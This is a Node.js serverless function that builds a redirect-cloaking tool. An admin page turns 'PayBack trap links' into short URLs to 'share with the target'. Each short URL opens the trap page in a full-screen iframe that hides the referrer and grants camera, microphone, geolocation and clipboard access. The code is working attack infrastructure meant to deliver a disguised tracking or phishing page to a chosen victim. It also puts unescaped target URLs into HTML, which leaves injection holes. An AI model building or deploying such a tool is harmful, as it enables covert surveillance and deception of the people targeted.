// redirect-proxy/api/index.js
// Vercel serverless function — handles all routes
// Set ADMIN_KEY env var in Vercel dashboard before deploying

const { kv } = require("@vercel/kv");
const crypto = require("crypto");

function generateCode() {
  return crypto.randomBytes(4).toString("hex"); // e.g. "a3f9b1c2"
}

const ADMIN_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Proxy Admin</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: #0a0a0a; color: #eee; font-family: 'Courier New', monospace; min-height: 100vh; display: flex; align-items: flex-start; justify-content: center; padding: 40px 16px; }
  .wrap { width: 100%; max-width: 640px; }
  h1 { font-size: 1.6rem; color: #ef4444; margin-bottom: 4px; letter-spacing: 2px; }
  .sub { font-size: 0.72rem; color: #555; margin-bottom: 32px; letter-spacing: 1px; text-transform: uppercase; }
  label { display: block; font-size: 0.7rem; color: #777; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
  input { width: 100%; background: #111; border: 1px solid #333; color: #eee; padding: 10px 14px; border-radius: 6px; font-family: inherit; font-size: 0.9rem; margin-bottom: 16px; outline: none; }
  input:focus { border-color: #ef4444; }
  button { background: #ef4444; color: #fff; border: none; padding: 12px 28px; border-radius: 6px; font-family: inherit; font-weight: bold; letter-spacing: 1px; cursor: pointer; font-size: 0.85rem; width: 100%; }
  button:hover { background: #dc2626; }
  .result { margin-top: 24px; background: #111; border: 1px solid #1f2937; padding: 18px; border-radius: 8px; display: none; }
  .result.show { display: block; }
  .result p { font-size: 0.78rem; color: #6b7280; margin-bottom: 6px; }
  .url { font-size: 0.9rem; color: #34d399; word-break: break-all; cursor: pointer; padding: 8px; background: #0a1a12; border-radius: 4px; }
  .url:hover { background: #0d2218; }
  .copy-hint { font-size: 0.68rem; color: #4b5563; margin-top: 4px; }
  .log { margin-top: 32px; }
  .log h2 { font-size: 0.75rem; color: #555; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
  .log-item { background: #0f0f0f; border: 1px solid #1a1a1a; padding: 10px 14px; border-radius: 6px; margin-bottom: 6px; display: flex; justify-content: space-between; align-items: center; gap: 8px; }
  .log-code { color: #ef4444; font-weight: bold; font-size: 0.85rem; }
  .log-target { color: #6b7280; font-size: 0.75rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex: 1; }
  .log-link { color: #3b82f6; font-size: 0.75rem; text-decoration: none; }
  .err { color: #f87171; margin-top: 12px; font-size: 0.8rem; }
</style>
</head>
<body>
<div class="wrap">
  <h1>PROXY ADMIN</h1>
  <p class="sub">// death x payback — redirect manager</p>

  <div>
    <label>Admin Key</label>
    <input id="key" type="password" placeholder="Your ADMIN_KEY from Vercel env">
  </div>
  <div>
    <label>Target URL (PayBack trap link)</label>
    <input id="target" type="url" placeholder="https://payback.replit.app/trap/uuid...">
  </div>
  <button onclick="create()">Generate Redirect Link</button>
  <div id="err" class="err"></div>

  <div class="result" id="result">
    <p>// Redirect created. Share this URL with the target:</p>
    <div class="url" id="url" onclick="copy()"></div>
    <div class="copy-hint">Click URL to copy</div>
  </div>

  <div class="log" id="log-section">
    <h2>// Active Redirects</h2>
    <div id="log-items">Loading…</div>
  </div>
</div>
<script>
  const HOST = window.location.origin;

  async function create() {
    const key = document.getElementById('key').value.trim();
    const target = document.getElementById('target').value.trim();
    document.getElementById('err').textContent = '';
    if (!key || !target) { document.getElementById('err').textContent = 'Both fields required.'; return; }

    const res = await fetch('/api/create', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ adminKey: key, target }),
    });
    const json = await res.json();
    if (!res.ok) { document.getElementById('err').textContent = json.error || 'Error.'; return; }

    const el = document.getElementById('url');
    el.textContent = json.url;
    document.getElementById('result').classList.add('show');
    loadList(key);
  }

  function copy() {
    const url = document.getElementById('url').textContent;
    navigator.clipboard.writeText(url).then(() => {
      document.querySelector('.copy-hint').textContent = 'Copied!';
      setTimeout(() => { document.querySelector('.copy-hint').textContent = 'Click URL to copy'; }, 1800);
    });
  }

  async function loadList(key) {
    if (!key) key = document.getElementById('key').value.trim();
    if (!key) return;
    const res = await fetch('/api/list?adminKey=' + encodeURIComponent(key));
    if (!res.ok) return;
    const { redirects } = await res.json();
    const el = document.getElementById('log-items');
    if (!redirects.length) { el.innerHTML = '<div style="color:#4b5563;font-size:0.78rem">No redirects yet.</div>'; return; }
    el.innerHTML = redirects.map(r =>
      '<div class="log-item"><span class="log-code">/' + r.code + '</span><span class="log-target">' + r.target + '</span><a class="log-link" href="/' + r.code + '" target="_blank">Open ↗</a></div>'
    ).join('');
  }

  document.getElementById('key').addEventListener('blur', () => loadList());
</script>
</body>
</html>`;

// ─── iframe proxy HTML ───────────────────────────────────────────
function proxyHtml(target) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="referrer" content="no-referrer">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
html, body { width: 100%; height: 100%; overflow: hidden; background: #fff; }
iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; display: block; }
</style>
</head>
<body>
<iframe
  src="${target}"
  sandbox="allow-scripts allow-same-origin allow-forms allow-modals allow-popups allow-top-navigation-by-user-activation allow-downloads"
  allow="camera; microphone; geolocation; notifications; clipboard-read; clipboard-write"
></iframe>
</body>
</html>`;
}

// ─── HANDLER ────────────────────────────────────────────────────
module.exports = async function handler(req, res) {
  const url = new URL(req.url, `https://${req.headers.host}`);
  const path = url.pathname;

  // ── POST /api/create ──────────────────────────────────────────
  if (req.method === "POST" && path === "/api/create") {
    let body = "";
    for await (const chunk of req) body += chunk;
    const { adminKey, target } = JSON.parse(body || "{}");

    if (adminKey !== process.env.ADMIN_KEY) {
      return res.status(401).json({ error: "Unauthorized" });
    }
    if (!target || !target.startsWith("http")) {
      return res.status(400).json({ error: "Invalid target URL" });
    }

    const code = generateCode();
    await kv.set(`r:${code}`, target);
    await kv.lpush("r:index", code);

    const redirectUrl = `https://${req.headers.host}/${code}`;
    return res.status(200).json({ code, url: redirectUrl });
  }

  // ── GET /api/list ─────────────────────────────────────────────
  if (req.method === "GET" && path === "/api/list") {
    const adminKey = url.searchParams.get("adminKey");
    if (adminKey !== process.env.ADMIN_KEY) {
      return res.status(401).json({ error: "Unauthorized" });
    }
    const codes = (await kv.lrange("r:index", 0, 49)) || [];
    const redirects = await Promise.all(
      codes.map(async (code) => {
        const target = await kv.get(`r:${code}`);
        return { code, target: target || "" };
      })
    );
    return res.status(200).json({ redirects: redirects.filter((r) => r.target) });
  }

  // ── GET / ─────────────────────────────────────────────────────
  if (req.method === "GET" && (path === "/" || path === "")) {
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    return res.status(200).send(ADMIN_HTML);
  }

  // ── GET /:code ────────────────────────────────────────────────
  if (req.method === "GET") {
    const code = path.replace(/^\//, "").split("/")[0];
    if (!code || code === "favicon.ico") {
      return res.status(404).send("Not found");
    }

    const target = await kv.get(`r:${code}`);
    if (!target) {
      return res.status(404).send("<h2 style='font-family:sans-serif;padding:2rem'>Link not found</h2>");
    }

    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.setHeader("X-Frame-Options", "DENY");
    res.setHeader("Cache-Control", "no-store");
    return res.status(200).send(proxyHtml(target));
  }

  return res.status(405).send("Method not allowed");
};
